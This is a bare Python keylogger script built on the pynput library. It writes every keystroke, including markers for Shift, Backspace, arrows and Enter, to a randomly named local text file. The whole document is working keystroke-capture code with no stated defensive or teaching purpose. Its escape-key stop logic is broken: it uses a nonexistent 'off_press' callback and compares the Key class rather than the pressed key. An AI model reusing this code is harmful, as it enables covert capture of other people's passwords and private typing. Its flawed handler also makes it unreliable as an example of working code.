from pynput.keyboard import Key, Listener
import random

file_name = 'file' + str(random.randint(0, 10000)) + '.txt'
f = open(file_name, 'w')


def on_press(key):
    listen = str(key)
    listen = listen.replace("'", "")
    if listen == "Key.space":
        listen = " "
    if listen == "Key.shift":
        listen = "[SHIFT]\n"
    if listen == "Key.right":
        listen = "[RIGHT]\n"
    if listen == "Key.left":
        listen = "[LEFT]\n"
    if listen == "Key.alt_l":
        listen = "[ALT]\n"
    if listen == "Key.backspace":
        listen = "[BACKSPACE]\n"
    if listen == "Key.tab":
        listen = "  "
    if listen == "Key.enter":
        listen = "\n"
    with open(file_name, 'a') as l:
        l.write('{0} '.format(listen))


def off_press(key):
    if Key == Key.esc:
        return False


with Listener(on_press=on_press, off_press=off_press) as i:
    i.join()

f.close()
